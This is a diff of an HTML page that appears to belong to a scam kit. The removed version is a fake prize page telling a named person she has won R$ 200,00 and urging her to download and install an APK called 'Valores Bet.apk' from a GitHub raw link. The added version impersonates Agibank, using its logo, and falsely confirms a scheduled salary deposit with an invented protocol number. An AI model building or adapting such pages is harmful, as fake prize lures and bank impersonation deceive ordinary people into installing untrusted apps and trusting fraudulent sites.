@@ -3,176 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Madeireira Premium | App Oficial</title>
+    <title>Agibank - Agendamento de Salário</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
-            min-height: 100vh;
+        :root {
+            /* Cores extraídas e inspiradas no logo Agibank */
+            --agi-blue: #00bcd4;
+            --agi-dark-blue: #002d4b;
+            --agi-light-bg: #f0f7f9;
         }
         
-        .wood-texture {
-            background-color: #3d2b1f;
-            background-image: url("https://www.transparenttextures.com/patterns/wood-pattern.png");
+        body {
+            background-color: var(--agi-light-bg);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
 
-        .glass-card {
-            background: rgba(255, 255, 255, 0.7);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.07);
+        .agi-card {
+            border-top: 6px solid var(--agi-blue);
         }
 
-        .btn-glow {
-            position: relative;
-            overflow: hidden;
-            transition: all 0.4s ease;
+        .btn-primary {
+            background-color: var(--agi-blue);
+            transition: all 0.2s ease-in-out;
         }
 
-        .btn-glow:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(22, 163, 74, 0.3);
+        .btn-primary:active {
+            transform: scale(0.98);
+            filter: brightness(0.9);
         }
 
-        .btn-glow::after {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: rgba(255,255,255,0.2);
-            transform: rotate(45deg);
-            transition: 0.5s;
-            left: -100%;
+        .logo-container {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
         }
 
-        .btn-glow:hover::after {
-            left: 100%;
-        }
-
-        @keyframes pulse-gold {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
-            70% { transform: scale(1.02); box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(245, 158, 11, 0); }
-        }
-
-        .prize-badge {
-            animation: pulse-gold 2s infinite;
+        .check-circle {
+            background: rgba(0, 188, 212, 0.1);
+            color: var(--agi-blue);
         }
     </style>
 </head>
-<body class="text-gray-900 antialiased">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <!-- Header Elegante -->
-    <header class="wood-texture text-white py-8 shadow-2xl relative overflow-hidden">
-        <div class="absolute inset-0 bg-black opacity-20"></div>
-        <div class="container mx-auto px-4 text-center relative z-10">
-            <div class="flex flex-col items-center justify-center gap-2">
-                <div class="bg-yellow-500 p-3 rounded-xl mb-2 shadow-lg">
-                    <i class="fas fa-tree text-3xl text-white"></i>
-                </div>
-                <h1 class="text-2xl font-black tracking-[0.2em] text-white">MADEIREIRA <span class="text-yellow-500">PREMIUM</span></h1>
-                <div class="h-1 w-12 bg-yellow-500 rounded-full"></div>
-            </div>
-        </div>
-    </header>
-
-    <main class="container mx-auto px-6 py-12 flex flex-col items-center max-w-lg">
-        
-        <!-- Banner de Vencedor Estilizado -->
-        <div class="w-full glass-card rounded-[2.5rem] p-8 mb-10 text-center relative overflow-hidden">
-            <div class="absolute top-0 right-0 p-4 opacity-10">
-                <i class="fas fa-crown text-6xl rotate-12"></i>
-            </div>
-            
-            <div class="prize-badge inline-flex bg-yellow-500 text-white w-16 h-16 items-center justify-center rounded-full mb-6 shadow-xl">
-                <i class="fas fa-trophy text-2xl"></i>
-            </div>
-
-            <h2 class="text-3xl font-black text-gray-900 mb-3 tracking-tight">CHEILA, PARABÉNS!</h2>
-            <p class="text-gray-500 font-medium leading-relaxed">
-                O seu prêmio de <span class="text-green-600 font-extrabold text-2xl block my-2">R$ 200,00</span> está pronto para ser levantado.
-            </p>
-            
-            <div class="mt-6 py-2 px-4 bg-yellow-50 inline-block rounded-full border border-yellow-100">
-                <p class="text-[10px] font-bold text-yellow-700 uppercase tracking-widest">Sorteio Trimestral Exclusivo</p>
+    <div class="w-full max-w-md bg-white rounded-[2.5rem] shadow-2xl overflow-hidden agi-card">
+        <!-- Header com Logo -->
+        <div class="pt-10 pb-6 text-center">
+            <div class="logo-container mb-4">
+                <img 
+                    src="https://play-lh.googleusercontent.com/A51HxOlU7KzYgxOzkJIXaDEyJYDSeUbs6fmEOajPR9PuEETw0LVko1snEauJAbuxDA" 
+                    alt="Logo Agibank" 
+                    class="w-full h-full object-contain rounded-2xl shadow-sm"
+                    onerror="this.src='https://via.placeholder.com/80?text=Agi'"
+                >
             </div>
         </div>
 
-        <!-- Secção de Download -->
-        <div class="w-full space-y-8">
-            <div class="text-center">
-                <h3 class="text-lg font-bold text-gray-700">Acesse ao seu Bônus</h3>
-                <p class="text-gray-400 text-sm mt-1">Siga o passo abaixo para instalar</p>
+        <!-- Conteúdo Principal -->
+        <div class="px-8 pb-10 text-center">
+            <!-- Ícone de Sucesso -->
+            <div class="w-16 h-16 check-circle rounded-full flex items-center justify-center mx-auto mb-4">
+                <i class="fas fa-calendar-check text-2xl"></i>
             </div>
 
-            <!-- Botão de Download Direto com a URL fornecida -->
-            <a href="http://github.com/Abravaaaa/AAAA/raw/main/Valores%20Bet.apk" class="btn-glow flex items-center justify-between w-full bg-stone-900 hover:bg-stone-800 text-white p-2 rounded-3xl shadow-2xl transition-all">
-                <span class="bg-green-600 w-14 h-14 rounded-2xl flex items-center justify-center text-2xl shadow-inner">
-                    <i class="fas fa-download"></i>
-                </span>
-                <span class="text-lg font-bold tracking-tight pr-8">BAIXAR APP (APK)</span>
-                <span></span> <!-- Spacer -->
-            </a>
-
-            <!-- Card Informativo Glassmorphism -->
-            <div class="glass-card p-6 rounded-3xl border-l-4 border-blue-500">
-                <div class="flex gap-4">
-                    <div class="text-blue-500 text-xl"><i class="fas fa-info-circle"></i></div>
-                    <div class="space-y-3">
-                        <p class="text-xs text-gray-600 leading-relaxed font-medium">
-                            Dentro da nossa aplicação terá acesso imediato a:
-                        </p>
-                        <ul class="text-[11px] text-gray-500 space-y-2">
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Levantamento de valores via PIX</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Avaliação premiada</li>
-                            <li class="flex items-center gap-2"><i class="fas fa-check text-green-500"></i> Novos sorteios a cada 90 dias</li>
-                        </ul>
-                    </div>
+            <h1 class="text-xl font-bold text-slate-800 mb-3">Tudo certo!</h1>
+            
+            <div class="space-y-2 mb-8">
+                <p class="text-slate-600">
+                    O recebimento do seu salário foi agendado com sucesso.
+                </p>
+                <div class="inline-block bg-slate-50 px-4 py-2 rounded-full border border-slate-100">
+                    <span class="text-slate-500 text-sm">Data prevista:</span>
+                    <span class="font-bold text-slate-800 ml-1">28/04</span>
                 </div>
             </div>
-        </div>
 
-        <!-- Timeline de Instalação -->
-        <div class="mt-16 w-full px-4">
-            <div class="relative flex justify-between items-center">
-                <div class="absolute h-0.5 bg-gray-200 w-full top-1/2 -z-10"></div>
+            <!-- Card de Instrução -->
+            <div class="bg-blue-50/50 rounded-2xl p-5 mb-8 text-left flex items-start gap-3">
+                <div class="mt-1 text-cyan-600">
+                    <i class="fas fa-receipt"></i>
+                </div>
+                <div>
+                    <p class="text-sm font-medium text-cyan-900 leading-tight">
+                        Fique de olho no seu extrato para conferir o lançamento.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Ações -->
+            <div class="space-y-4">
+                <button onclick="showToast()" class="w-full btn-primary text-white font-bold py-4 rounded-2xl shadow-lg shadow-cyan-200">
+                    Verificar meu extrato
+                </button>
                 
-                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
-                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">01</div>
-                </div>
-                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
-                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">02</div>
-                </div>
-                <div class="bg-white p-2 rounded-full border-2 border-gray-100 shadow-sm">
-                    <div class="w-8 h-8 rounded-full bg-stone-100 flex items-center justify-center text-[10px] font-bold">03</div>
-                </div>
-            </div>
-            <div class="flex justify-between mt-3 px-2">
-                <span class="text-[9px] font-black text-gray-400 uppercase">Download</span>
-                <span class="text-[9px] font-black text-gray-400 uppercase">Instalar</span>
-                <span class="text-[9px] font-black text-gray-400 uppercase">Resgatar</span>
+                <button class="w-full text-slate-400 font-medium py-2 text-sm hover:text-slate-600 transition-colors">
+                    Voltar para o início
+                </button>
             </div>
         </div>
 
-    </main>
-
-    <!-- Footer Premium -->
-    <footer class="mt-auto py-10 bg-white border-t border-gray-100">
-        <div class="container mx-auto px-4 text-center">
-            <p class="text-stone-400 text-[10px] font-bold tracking-[0.3em] uppercase mb-2">Madeireira Premium S.A.</p>
-            <div class="flex justify-center gap-4 text-gray-300 text-sm">
-                <i class="fab fa-instagram"></i>
-                <i class="fab fa-facebook"></i>
-                <i class="fab fa-whatsapp"></i>
-            </div>
-            <p class="text-gray-400 text-[9px] mt-4 italic">Sorteios auditados e processados via App Oficial.</p>
+        <!-- Rodapé Estilizado -->
+        <div class="bg-slate-50 py-4 px-8 border-t border-slate-100 flex justify-between items-center">
+            <span class="text-[10px] text-slate-400 uppercase tracking-widest font-bold">Protocolo: 8293041</span>
+            <i class="fas fa-shield-alt text-slate-300 text-sm"></i>
         </div>
-    </footer>
+    </div>
 
+    <!-- Feedback Visual -->
+    <div id="toast" class="fixed bottom-8 left-1/2 -translate-x-1/2 bg-slate-900 text-white px-6 py-3 rounded-full text-sm font-medium opacity-0 transition-opacity pointer-events-none">
+        Abrindo extrato...
+    </div>
+
+    <script>
+        function showToast() {
+            const toast = document.getElementById('toast');
+            toast.style.opacity = '1';
+            setTimeout(() => {
+                toast.style.opacity = '0';
+            }, 2500);
+        }
+    </script>
 </body>
 </html>
